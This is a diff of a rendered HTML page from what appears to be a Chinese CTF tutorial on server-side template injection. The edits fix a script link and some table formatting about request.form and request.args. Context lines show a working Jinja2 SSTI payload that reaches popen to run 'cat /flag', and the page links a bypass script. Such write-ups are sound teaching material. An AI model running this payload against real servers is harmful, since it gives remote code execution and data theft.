@@ -1235,7 +1235,7 @@
 <pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="p">{{</span><span class="s1">&#39;&#39;</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="n">__base__</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()[</span><span class="mi">141</span><span class="p">]</span><span class="o">.</span><span class="fm">__init__</span><span class="o">.</span><span class="vm">__globals__</span><span class="p">[</span><span class="s1">&#39;popen&#39;</span><span class="p">](</span><span class="s1">&#39;cat /flag&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()}}</span>
 </span></span></code></pre></td></tr></table>
 </div>
-</div><p>对于上述两种绕过，可以使用给出的脚本<a class="link" href="https://raw.githubusercontent.com/makabaka11/blog-files/refs/heads/master/ssti.txt"  target="_blank" rel="noopener"
+</div><p>对于上述两种绕过，可以使用给出的脚本<a class="link" href="https://raw.githubusercontent.com/makabaka11/blog-files/refs/heads/master/ssti.py"  target="_blank" rel="noopener"
     >ssti.py</a></p>
 <h3 id="过滤下划线">过滤下划线
 </h3><div class="table-wrapper"><table>
@@ -1249,12 +1249,12 @@
   <tbody>
       <tr>
           <td><code>request.form</code></td>
-          <td>从 **请求体(Body) **中解析表单数据</td>
+          <td>从 **请求体(Body)**中解析表单数据</td>
           <td>主要是 <strong>POST</strong></td>
       </tr>
       <tr>
           <td><code>request.args</code></td>
-          <td>从 **URL 查询字符串 **中获取参数</td>
+          <td>从 <strong>URL 查询字符串</strong>中获取参数</td>
           <td>主要是 <strong>GET</strong></td>
       </tr>
   </tbody>
